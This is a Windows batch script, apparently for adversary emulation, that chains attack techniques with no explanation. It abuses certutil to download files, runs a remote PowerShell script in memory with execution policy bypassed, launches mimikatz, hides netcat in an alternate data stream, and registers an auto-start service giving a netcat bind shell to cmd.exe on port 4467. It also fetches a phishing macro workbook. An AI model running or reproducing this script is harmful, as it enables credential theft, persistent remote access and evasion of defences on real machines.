@echo on

copy %windir%\system32\certutil.exe %temp%\cr.tmp

%temp%\cr.tmp -urlcache -split -f https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1 %Temp%\mark.ps1


powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1')"



start %temp%\mimikatz.exe

%temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/nc64.exe %Temp%\nc.exe

%temp%\cr.tmp -encode %Temp%\nc.exe %Temp%\nc.txt

type %Temp%\nc.txt > %Temp%\README.txt:hid.txt
%temp%\cr.tmp -decode %Temp%\README.txt:hid.txt %Temp%\nc64.exe


%temp%\cr.tmp -urlcache -split -f https://github.com/daemondevin/7-ZipPortable/raw/master/App/7-Zip64/7z.exe %Temp%\7z.exe


sc create XSample binPath= "cmd.exe /C %Temp%\nc64.exe -nLvp 4467 -e cmd.exe" start= auto DisplayName= "XSample Service" & sc start XSample

start /wait reg.exe add "HKEY_CURRENT_USER\Software\Classes\XSample" /v XXX /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2Nucm1hcmsudHh0IiAtdmFsdWUgInRhcmdldCI="

start calc

powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1')"
powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm?raw=true','%Temp%\s.xlsm')"


